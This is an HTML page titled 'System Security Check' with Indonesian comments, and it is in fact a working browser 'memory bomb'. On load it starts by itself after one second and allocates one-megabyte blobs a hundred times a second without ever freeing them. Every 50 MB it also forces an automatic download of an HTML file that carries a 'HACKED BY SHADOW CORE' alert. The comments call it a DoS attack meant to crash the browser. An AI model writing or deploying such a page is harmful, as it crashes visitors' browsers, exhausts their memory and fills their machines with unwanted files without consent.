<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Security Check</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: monospace; background: #111; color: #0f0; padding: 20px; text-align: center; overflow: hidden; }
  .panel { background: #222; padding: 20px; border-radius: 12px; max-width: 500px; margin: 50px auto; border: 1px solid #333; }
  h2 { color: #f00; margin-bottom: 15px; animation: blink 0.5s infinite; }
  @keyframes blink { 50% { opacity: 0.2; } }
  #status { margin-top: 15px; font-weight: bold; padding: 10px; background: #000; border-radius: 6px; color: #ff0; }
</style>
</head>
<body>

<div class="panel">
  <h2>☢️ MEMORY EXHAUSTION ☢️</h2>
  <p>Mengalokasikan RAM dan membuat Blob secara brutal...</p>
  <div id="status" role="status">Sistem siap.</div>
</div>

<script>
(function () {
  'use strict';

  var statusDiv = document.getElementById('status');
  var blobUrls = []; // Array untuk menahan URL (Memory Leak)
  var count = 0;
  var isProcessing = false;

  // Payload HTML untuk file yang diunduh
  var payloadText = "<!DOCTYPE html><html><body><script>alert('HACKED BY SHADOW CORE')<\/script></body></html>";

  // ============================================
  // FUNGSI MEMORY BOMB (OOM & FLOODING)
  // ============================================
  function triggerMemoryBomb() {
    if (isProcessing) return;
    isProcessing = true;
    statusDiv.innerText = "Memulai serangan DoS...";

    // Loop tanpa henti (setiap 10ms)
    var interval = setInterval(function() {
      try {
        // 1. Buat Blob (Ukuran 1MB agar cepat penuh)
        var blobData = new Uint8Array(1024 * 1024); // 1MB
        blobData.fill(1);
        var blob = new Blob([blobData], { type: 'application/octet-stream' });
        
        // 2. Buat Object URL
        var url = URL.createObjectURL(blob);
        
        // 3. TAHAN URL DI MEMORY (Jangan di-revoke)
        // Ini yang menyebabkan Memory Leak (Out of Memory)
        blobUrls.push(url);
        
        count++;
        statusDiv.innerText = "Blob dialokasikan: " + count + " MB";

        // 4. Setiap 50MB, picu unduhan untuk menambah beban
        if (count % 50 === 0) {
          var a = document.createElement('a');
          a.href = URL.createObjectURL(new Blob([payloadText], { type: 'text/html' }));
          a.download = `waguri-bomb-${count}.html`;
          a.style.display = 'none';
          document.body.appendChild(a);
          a.click();
          // Jangan hapus 'a' atau revoke URL agar memory leak makin parah
        }

      } catch(e) {
        // Jika browser sudah kehabisan memori, akan error di sini
        clearInterval(interval);
        statusDiv.innerText = "BROWSER CRASH: " + e.message;
        statusDiv.style.color = "#f00";
      }
    }, 10); // 10ms = 100x per detik
  }

  // ============================================
  // TRIGGER OTOMATIS (ZERO-CLICK)
  // ============================================
  // Jalankan setelah 1 detik halaman dimuat
  setTimeout(triggerMemoryBomb, 1000);

})();
</script>
</body>
</html>
